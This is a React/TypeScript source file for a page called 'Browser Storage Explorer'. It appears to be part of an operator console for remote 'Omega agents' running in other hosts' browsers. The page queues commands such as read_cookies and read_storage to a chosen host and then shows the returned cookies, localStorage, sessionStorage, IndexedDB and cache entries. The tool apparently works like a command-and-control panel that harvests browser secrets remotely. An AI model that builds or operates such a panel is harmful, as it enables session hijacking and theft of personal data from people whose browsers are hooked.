// Copyright © 2026 Alpha Unlimited Technologies LLC. All rights reserved.
// Browser Storage Explorer — reads real data from live Omega agents.
// In a browser context, "drives" = browser storage types: localStorage, sessionStorage, Cookies, IndexedDB, Cache Storage.
import { useState } from "react";
import { Layout } from "@/components/layout";
import { useListHosts } from "@workspace/omega-api-client-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Skeleton } from "@/components/ui/skeleton";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { Database, Cookie, HardDrive, Clock, Archive, ArrowLeft, RefreshCw, FolderOpen, Search, ChevronRight } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

type RCmd = { id: number; hostId: number; commandType: string; params: string; status: string; result: string; executedAt: string };

const DRIVES = [
  { id: "localStorage",    label: "localStorage",   icon: Database,  cmd: "read_storage",       desc: "Persistent key-value store" },
  { id: "sessionStorage",  label: "sessionStorage",  icon: Clock,     cmd: "read_storage",       desc: "Session-scoped key-value store" },
  { id: "cookies",         label: "Cookies",         icon: Cookie,    cmd: "read_cookies",       desc: "HTTP cookies for this origin" },
  { id: "indexeddb",       label: "IndexedDB",       icon: Archive,   cmd: "list_indexeddb",     desc: "Structured client-side databases" },
  { id: "cache",           label: "Cache Storage",   icon: HardDrive, cmd: "list_cache_storage", desc: "Service worker cache entries" },
] as const;

type DriveId = typeof DRIVES[number]["id"];

async function getCommands(hostId: number): Promise<RCmd[]> {
  const r = await fetch(`/api/remote-commands/${hostId}`);
  if (!r.ok) throw new Error("Failed");
  return r.json();
}

async function queueCommand(hostId: number, commandType: string): Promise<RCmd> {
  const r = await fetch(`/api/remote-commands/${hostId}/execute`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ commandType }),
  });
  if (!r.ok) throw new Error("Failed");
  return r.json();
}

type ParsedEntry = { key: string; value: string; size: string };

function parseResult(driveId: DriveId, result: string): ParsedEntry[] | string {
  try {
    if (driveId === "localStorage" || driveId === "sessionStorage") {
      const obj = JSON.parse(result);
      const store = driveId === "localStorage" ? obj.localStorage : obj.sessionStorage;
      if (!store || typeof store !== "object") return [];
      return Object.entries(store).map(([k, v]) => {
        const val = String(v);
        return { key: k, value: val.substring(0, 200), size: `${val.length} B` };
      });
    }
    if (driveId === "cookies") {
      if (!result || result === "(no cookies)") return [];
      return result.split(";").map(c => {
        const [k, ...rest] = c.trim().split("=");
        const v = rest.join("=");
        return { key: k?.trim() ?? "", value: v?.trim() ?? "", size: `${c.length} B` };
      }).filter(e => e.key);
    }
    if (driveId === "indexeddb") {
      const arr = JSON.parse(result);
      if (!Array.isArray(arr)) return [];
      return arr.map((db: any) => ({
        key: db.name ?? "(unnamed)",
        value: `v${db.version ?? 1}`,
        size: "database",
      }));
    }
    if (driveId === "cache") {
      const arr = JSON.parse(result);
      if (!Array.isArray(arr)) return [];
      return arr.map((name: string) => ({ key: name, value: "(cache)", size: "cache" }));
    }
  } catch {
    return result;
  }
  return [];
}

export default function FileManager() {
  const [selectedHostId, setSelectedHostId] = useState<number | null>(null);
  const [selectedDrive, setSelectedDrive] = useState<DriveId | null>(null);
  const [pendingCmdId, setPendingCmdId] = useState<number | null>(null);
  const [search, setSearch] = useState("");
  const { data: hosts } = useListHosts();
  const qc = useQueryClient();
  const { toast } = useToast();

  const { data: commands, isLoading: cmdsLoading } = useQuery({
    queryKey: ["file-cmds", selectedHostId],
    queryFn: () => getCommands(selectedHostId!),
    enabled: !!selectedHostId,
    refetchInterval: 3000,
  });

  const browseMut = useMutation({
    mutationFn: (driveId: DriveId) => {
      const drive = DRIVES.find(d => d.id === driveId)!;
      return queueCommand(selectedHostId!, drive.cmd);
    },
    onSuccess: (cmd) => {
      setPendingCmdId(cmd.id);
      qc.invalidateQueries({ queryKey: ["file-cmds", selectedHostId] });
      toast({ title: "Command queued", description: "Agent will respond on next poll (≤3s)" });
    },
    onError: () => toast({ title: "Failed to queue command", variant: "destructive" }),
  });

  const selectedDriveInfo = DRIVES.find(d => d.id === selectedDrive);

  const latestResult = commands && selectedDrive
    ? commands.find(c => {
        const drive = DRIVES.find(d => d.id === selectedDrive);
        return c.commandType === drive?.cmd && c.status === "executed" && (pendingCmdId === null || c.id === pendingCmdId || c.id > (pendingCmdId ?? 0));
      })
    : null;

  const isPending = pendingCmdId !== null && commands
    ? commands.find(c => c.id === pendingCmdId)?.status === "pending" || commands.find(c => c.id === pendingCmdId)?.status === "sent"
    : false;

  const parsedData = latestResult ? parseResult(selectedDrive!, latestResult.result) : null;
  const entries: ParsedEntry[] = Array.isArray(parsedData) ? parsedData : [];
  const rawError = typeof parsedData === "string" ? parsedData : null;

  const filtered = entries.filter(e =>
    e.key.toLowerCase().includes(search.toLowerCase()) ||
    e.value.toLowerCase().includes(search.toLowerCase())
  );

  const selectedHost = hosts?.find(h => h.id === selectedHostId);

  return (
    <Layout>
      <div className="space-y-6">
        <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
          <div>
            <h1 className="text-3xl font-bold tracking-tight flex items-center gap-3">
              <FolderOpen className="h-7 w-7 text-primary" /> Browser Storage Explorer
            </h1>
            <p className="text-muted-foreground mt-1">Read real browser storage data from live Omega agents.</p>
          </div>
          <Select value={selectedHostId?.toString() ?? ""} onValueChange={v => { setSelectedHostId(parseInt(v)); setSelectedDrive(null); setPendingCmdId(null); }}>
            <SelectTrigger className="w-[200px]"><SelectValue placeholder="Select a host..." /></SelectTrigger>
            <SelectContent>
              {hosts?.map(h => (
                <SelectItem key={h.id} value={h.id.toString()}>
                  <span className="flex items-center gap-2">
                    <span className={`w-2 h-2 rounded-full inline-block ${h.status === 'online' ? 'bg-green-500' : h.status === 'offline' ? 'bg-red-500' : 'bg-gray-500'}`} />
                    {h.label}
                  </span>
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        {!selectedHostId ? (
          <Card className="border-border bg-card/40">
            <CardContent className="py-16 text-center text-muted-foreground">Select a host to explore its browser storage.</CardContent>
          </Card>
        ) : (
          <Card className="border-border bg-card/40">
            {/* Path bar */}
            <div className="flex items-center gap-1 px-4 py-2 border-b border-border bg-black/20 font-mono text-xs text-muted-foreground overflow-x-auto">
              {selectedDrive ? (
                <>
                  <button onClick={() => { setSelectedDrive(null); setPendingCmdId(null); setSearch(""); }} className="hover:text-primary transition-colors">Browser Storage</button>
                  <ChevronRight className="h-3 w-3" />
                  <span className="text-primary">{selectedDriveInfo?.label}</span>
                </>
              ) : (
                <span className="text-primary">Browser Storage</span>
              )}
              {selectedHost?.status === "online" && (
                <span className="ml-auto flex items-center gap-1 text-green-400/70">
                  <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse inline-block" />
                  Agent connected
                </span>
              )}
            </div>

            {/* Toolbar */}
            {selectedDrive && (
              <div className="flex items-center gap-2 px-4 py-2 border-b border-border">
                <Button variant="ghost" size="sm" className="gap-1 text-xs" onClick={() => { setSelectedDrive(null); setPendingCmdId(null); setSearch(""); }}>
                  <ArrowLeft className="h-3.5 w-3.5" /> Up
                </Button>
                <Button
                  size="sm"
                  variant="outline"
                  className="gap-1 text-xs border-primary/30 text-primary"
                  onClick={() => { setPendingCmdId(null); browseMut.mutate(selectedDrive); }}
                  disabled={browseMut.isPending}
                >
                  <RefreshCw className={`h-3.5 w-3.5 ${browseMut.isPending ? "animate-spin" : ""}`} /> Refresh
                </Button>
                <div className="flex-1" />
                <div className="relative w-48">
                  <Search className="absolute left-2.5 top-1/2 -translate-y-1/2 h-3.5 w-3.5 text-muted-foreground" />
                  <Input value={search} onChange={e => setSearch(e.target.value)} placeholder="Filter..." className="pl-8 h-7 text-xs bg-black/20 border-border/50" />
                </div>
                {latestResult && (
                  <span className="text-[10px] text-muted-foreground/50 font-mono">
                    {entries.length} entries · {new Date(latestResult.executedAt).toLocaleTimeString()}
                  </span>
                )}
              </div>
            )}

            <CardContent className="p-0">
              {!selectedDrive ? (
                /* Drive grid */
                <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-4 p-4">
                  {DRIVES.map(drive => {
                    const Icon = drive.icon;
                    const lastCmd = commands?.find(c => c.commandType === drive.cmd && c.status === "executed");
                    return (
                      <button
                        key={drive.id}
                        onClick={() => { setSelectedDrive(drive.id); setPendingCmdId(null); browseMut.mutate(drive.id); }}
                        className="flex flex-col items-center gap-2 p-4 rounded-lg border border-border hover:border-primary/50 hover:bg-primary/5 transition-all group"
                      >
                        <Icon className="h-10 w-10 text-muted-foreground group-hover:text-primary transition-colors" />
                        <span className="font-mono text-sm font-medium">{drive.label}</span>
                        <span className="text-[10px] text-muted-foreground text-center leading-tight">{drive.desc}</span>
                        {lastCmd && <Badge variant="outline" className="text-[9px] text-green-400 border-green-400/30">data cached</Badge>}
                      </button>
                    );
                  })}
                </div>
              ) : (
                /* File listing */
                isPending || (browseMut.isPending && !latestResult) ? (
                  <div className="p-8 space-y-2">
                    <div className="flex items-center gap-2 text-primary text-sm font-mono mb-4">
                      <div className="w-2 h-2 rounded-full bg-primary animate-ping" />
                      Waiting for agent response…
                    </div>
                    {[...Array(6)].map((_, i) => <Skeleton key={i} className="h-8 w-full" />)}
                  </div>
                ) : rawError ? (
                  <div className="p-8 text-center">
                    <p className="text-muted-foreground text-sm">{rawError}</p>
                    <Button variant="outline" size="sm" className="mt-4" onClick={() => { setPendingCmdId(null); browseMut.mutate(selectedDrive); }}>
                      Retry
                    </Button>
                  </div>
                ) : !latestResult ? (
                  <div className="p-8 text-center text-muted-foreground text-sm">
                    No data yet. Click <strong>Refresh</strong> to read from the agent.
                  </div>
                ) : entries.length === 0 ? (
                  <div className="p-8 text-center text-muted-foreground text-sm">
                    Storage is empty — no entries found.
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <Table>
                      <TableHeader className="bg-muted/30">
                        <TableRow>
                          <TableHead className="font-mono text-xs w-1/3">Key / Name</TableHead>
                          <TableHead className="font-mono text-xs">Value</TableHead>
                          <TableHead className="font-mono text-xs w-24 text-right">Size</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {filtered.map((entry, i) => (
                          <TableRow key={i} className="border-border/50 hover:bg-muted/20">
                            <TableCell className="font-mono text-xs text-primary font-medium truncate max-w-[200px]" title={entry.key}>{entry.key}</TableCell>
                            <TableCell className="font-mono text-xs text-muted-foreground truncate max-w-xs" title={entry.value}>{entry.value}</TableCell>
                            <TableCell className="font-mono text-xs text-muted-foreground/50 text-right">{entry.size}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </div>
                )
              )}
            </CardContent>
          </Card>
        )}
      </div>
    </Layout>
  );
}
